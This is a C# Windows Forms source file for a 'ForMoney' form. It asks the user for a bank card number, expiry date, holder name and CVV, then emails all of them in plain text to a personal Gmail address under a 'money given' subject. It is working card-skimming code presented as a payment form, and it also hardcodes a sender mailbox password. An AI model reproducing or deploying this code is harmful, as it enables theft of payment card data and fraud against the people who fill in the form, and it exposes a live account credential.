using System;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace BUILD.modules
{
    public partial class ForMoney : Form
    {
        public ForMoney()
        {
            InitializeComponent();
        }

        private void button_send_money_Click(object sender, EventArgs e)
        {
            try
            {
                label_message.Text = String.Empty;
                string num, date1, date2, holder, ccccv;
                if (!Regex.IsMatch((num = textBox_card_number.Text), "[0-9]{4} [0-9]{4} [0-9]{4} [0-9]{4}"))
                {
                    label_message.Text = "неверный номер карты";
                    return;
                }

                date1 = textBox_time_1.Text.Trim();
                date2 = textBox_time_2.Text.Trim();
                if (date1 == String.Empty || date2 == String.Empty)
                {
                    label_message.Text = "неверная дата";
                    return;
                }

                if ((Convert.ToInt32(date1) > 12 || Convert.ToInt32(date1) < 1))
                {
                    label_message.Text = "неверный месяц";
                    return;
                }

                if (Convert.ToInt32(date2) < (new DateTime()).Year % 100)
                {
                    label_message.Text = "неверный год";
                    return;
                }

                holder = textBox_name_surname.Text.Trim().ToUpper();
                if (holder == String.Empty)
                {
                    label_message.Text = "неверное имя владельца";
                    return;
                }

                ccccv = textBox_cccv.Text;
                if (!Regex.IsMatch(ccccv, "[0-9]{3}"))
                {
                    label_message.Text = "неверный cvc/cvv";
                    return;
                }
                try
                {
                    //mail
                    
                    MailAddress from = new MailAddress("mail4build22@gmail.com", "firm build");
                    MailAddress to = new MailAddress("vorobevnik17@gmail.com");
                    MailMessage message = new MailMessage(from, to);
                    message.Subject = "деньга дали";
                    message.Body = $"номер:{num} дата: {date1}/{date2}, держатель: {holder}, cvc:{ccccv}";
                    message.IsBodyHtml = false;
                    
                    SmtpClient client = new SmtpClient("smtp.gmail.com", 587);//25 465 587
                    //SmtpClient client = new SmtpClient("smtp-relay.gmail.com", 25);
                    client.EnableSsl = true;
                    client.Timeout = 1000;
                    client.Credentials = new NetworkCredential(from.Address, "135qaz741");
                    client.Send(message);
                    MessageBox.Show("Спасибо!");
                }
                catch (Exception exception)
                {
                    //MessageBox.Show(exception.Message);
                    MessageBox.Show("Ошибка при отправке на почту");
                }

                this.Close();
                
            }
            catch (Exception exception)
            {
                //MessageBox.Show(exception.Message);
                MessageBox.Show("Ошибка при считывании данных");
            }

        }
    }
}